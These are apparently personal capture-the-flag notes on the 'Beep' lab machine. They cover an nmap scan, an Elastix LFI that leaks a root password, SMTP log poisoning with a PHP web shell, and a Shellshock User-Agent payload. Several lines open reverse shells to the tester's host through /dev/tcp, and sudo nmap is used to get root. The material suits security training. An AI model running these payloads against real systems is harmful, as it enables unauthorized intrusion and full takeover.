<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>10.10.10.7 Beep</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>10.10.10.7 Beep</h1><br/>Beep<br />nmap -sC -sV -oN /root/Desktop/10.10.10.7.txt 10.10.10.7<br />Nmap scan report for 10.10.10.7<br />Host is up (0.21s latency).<br />Not shown: 988 closed ports<br />PORT      STATE SERVICE    VERSION<br />22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)<br />| ssh-hostkey: <br />|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)<br />|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)<br />25/tcp    open  smtp       Postfix smtpd<br />|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, <br />80/tcp    open  http       Apache httpd 2.2.3<br />|_http-server-header: Apache/2.2.3 (CentOS)<br />|_http-title: Did not follow redirect to <a href="https://10.10.10.7/">https://10.10.10.7/</a><br />110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4<br />|_pop3-capabilities: EXPIRE(NEVER) LOGIN-DELAY(0) UIDL IMPLEMENTATION(Cyrus POP3 server v2) APOP PIPELINING AUTH-RESP-CODE RESP-CODES USER STLS TOP<br />111/tcp   open  rpcbind    2 (RPC #100000)<br />| rpcinfo: <br />|   program version   port/proto  service<br />|   100000  2            111/tcp  rpcbind<br />|   100000  2            111/udp  rpcbind<br />|   100024  1            742/udp  status<br />|_  100024  1            745/tcp  status<br />143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4<br />|_imap-capabilities: SORT IMAP4 ACL QUOTA SORT=MODSEQ THREAD=REFERENCES OK STARTTLS THREAD=ORDEREDSUBJECT URLAUTHA0001 LIST-SUBSCRIBED BINARY UNSELECT UIDPLUS IMAP4rev1 X-NETSCAPE LISTEXT CONDSTORE IDLE CATENATE ANNOTATEMORE MULTIAPPEND Completed ID NO CHILDREN MAILBOX-REFERRALS NAMESPACE RIGHTS=kxte ATOMIC RENAME LITERAL+<br />443/tcp   open  ssl/https?<br />|_ssl-date: 2019-07-02T23:07:08+00:00; -1h20m21s from scanner time.<br />993/tcp   open  ssl/imap   Cyrus imapd<br />|_imap-capabilities: CAPABILITY<br />995/tcp   open  pop3       Cyrus pop3d<br />3306/tcp  open  mysql      MySQL (unauthorized)<br />4445/tcp  open  upnotifyp?<br />10000/tcp open  http       MiniServ 1.570 (Webmin httpd)<br />|_http-title: Site doesn&#39;t have a title (text/html; Charset=iso-8859-1).<br />Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com<br /><br />Host script results:<br />|_clock-skew: mean: -1h20m21s, deviation: 0s, median: -1h20m21s<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 345.43 seconds<br /><br />--------------------------------------------------------------------------------------------------------------------------------------------------------<br />dirbuster (/usr/share/wordlists/dirb/common.txt )<br /><br />went to <a href="https://10.10.10.7/">https://10.10.10.7/</a><br />    saw machine was Elastix<br />        searchsploit elastix<br />            Elastix 2.2.0 - &#39;graph.php&#39; Local File Inclusion   | exploits/php/webapps/37637.pl<br />            cat exploits/php/webapps/37637.pl<br />                file inclusion at /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action<br />                    navigated to <a href="https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action">https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</a><br />                    view page sourcecode<br />                    saw usernames and password jEhdIekWmdjE<br />                    ssh root@10.10.10.7 <br />                    jEhdIekWmdjE<br />                    ROOT SHELL<br />                    <br /> -----------------------------------------------------------------------------------------------------------------------------------------------------<br />root@kali:~# telnet 10.10.10.7 25<br />Trying 10.10.10.7...<br />Connected to 10.10.10.7.<br />Escape character is &#39;^]&#39;.<br />220 beep.localdomain ESMTP Postfix<br />EHLO coolhandsquid.au<br />250-beep.localdomain<br />250-PIPELINING<br />250-SIZE 10240000<br />250-VRFY<br />250-ETRN<br />250-ENHANCEDSTATUSCODES<br />250-8BITMIME<br />250 DSN<br />VRFY asterisk@localhost  <br />252 2.0.0 asterisk@localhost<br />mail from:coolhandsquid@step-child.au<br />250 2.1.0 Ok<br />rcpt to:asterisk@localhost<br />250 2.1.5 Ok<br />data<br />354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;<br />Subject: You got owned<br />&lt;?php echo system($_REQUEST[&#39;squid&#39;]); ?&gt;<br /><br />.<br />250 2.0.0 Ok: queued as 84C50D92F8<br />^C<br />^]<br />telnet&gt; quit<br />Connection closed.<br /><br />IN BURP<br />in repeater replace GET /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action HTTP/1.1<br />with GET /vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&amp;module=Accounts&amp;action HTTP/1.1<br />to verify code execution after &amp;action put &amp;squid=whoami           run it in repeater. this should return asterisk<br />right click &gt; change execution method<br />at the end add execution &amp;squid=bash -i &gt;&amp; /dev/tcp/10.10.14.60/3232 0&gt;&amp;1<br />highlight bash -i &gt;&amp; /dev/tcp/10.10.14.60/3232 0&gt;&amp;1 and hit &quot;control u&quot; to encode in url. should look like    bash+-i+&gt;%26+/dev/tcp/10.10.14.60/3232+0&gt;%261<br />in terminal<br />    nc -lvnp 3232<br />in burp<br />    run<br />in terminal<br />    observe your new shell!!<br />other terminal<br />    searchsploit -x exploits/php/webapps/18650.py (found by searchsploit elastix)<br />in terminal<br />listening on [any] 3232 ...<br />connect to [10.10.14.60] from (UNKNOWN) [10.10.10.7] 49037<br />bash: no job control in this shell<br />bash-3.2$ id<br />uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)<br />bash-3.2$ whoami<br />asterisk<br />bash-3.2$ sudo nmap --interactive<br /><br />Starting Nmap V. 4.11 ( <a href="http://www.insecure.org/nmap/">http://www.insecure.org/nmap/</a> )<br />Welcome to Interactive Mode -- press h &lt;enter&gt; for help<br />nmap&gt; whoami<br />Unknown command (whoami) -- press h &lt;enter&gt; for help<br />nmap&gt; !sh<br />id<br />uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)<br /><br />--------------------------------------------------------------------------------------------------------------------------------------------------------------------<br />    <br />cp /usr/share/exploitdb/exploits/php/webapps/18650.py beep.py<br />nano beep.py (change lhost and what not. set extension to 322. extension found in 10.10.10.7/panel<br />python beep.py<br />    ssl handeling error<br />forward port 80 traffic to burp and 443 to 10.10.10.7<br />in script https -&gt; http<br />in burp<br />    proxy&gt;options&gt;add<br />        bind&gt;bind to port 80<br />        request handling&gt; redirect to host = 10.10.10.7 redirect to port=443<br />    make sure intercept is off<br />    send ran script to repeater<br />in terminal<br />    nc -lvnp 443<br />in burp<br />    go<br />in terminal <br />    enjoy your shell (you will still need to elevate.<br />    python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39;<br /><br /><br />__________________----------------------------------------_____________________________---------------------_______________________------------<br /><br />SHELLSHOCK<br />send a get request for 10.10.10.7:10000 to burp repeater<br />set useragent- <br />User-Agent: () { :; }; bash -i &gt;&amp; /dev/tcp/10.10.14.60/3232 0&gt;&amp;1<br />in terminal<br />    nc -lvnp 3232<br />in burp<br />    go<br />in terminal<br />    enjoy your root shell!!<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /></div></body></html>